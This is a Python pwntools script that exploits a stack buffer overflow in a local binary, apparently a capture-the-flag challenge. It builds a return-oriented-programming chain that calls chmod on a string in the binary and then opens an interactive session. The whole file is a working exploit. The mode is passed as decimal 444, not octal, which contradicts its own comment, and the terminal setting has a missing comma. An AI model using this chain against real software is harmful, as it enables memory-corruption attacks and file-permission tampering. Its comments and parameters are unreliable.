from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw' '-h']
localFILE = '/home/darkstar/Downloads/temp'

elf = ELF(localFILE)

rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])
pop_rax = rop.find_gadget(['pop rax', 'ret'])
syscall = rop.find_gadget(['syscall'])  # Address of the syscall gadget

str = next(elf.search(b"Leaving!"))

print("ROP chain")
print(rop.dump())

p = process(localFILE)

rop.raw(pop_rsi)
rop.raw(444)    # read permission for all three
rop.raw(pop_rdi)
rop.raw(str)       # address of string
rop.raw(pop_rax)
rop.raw(0x5A)       # syscall number for chmod
rop.raw(syscall)
#gdb.attach(p, '''
#    break *challenge+286
#    continue
#''')
p.recvuntil(b'\n')

payload = b'A'*40
payload += rop.chain()

hex_payload = ''.join(f'\\x{byte:02x}' for byte in payload)
print("Payload in hexadecimal:")
print(hex_payload)

p.sendline(payload)

p.interactive()
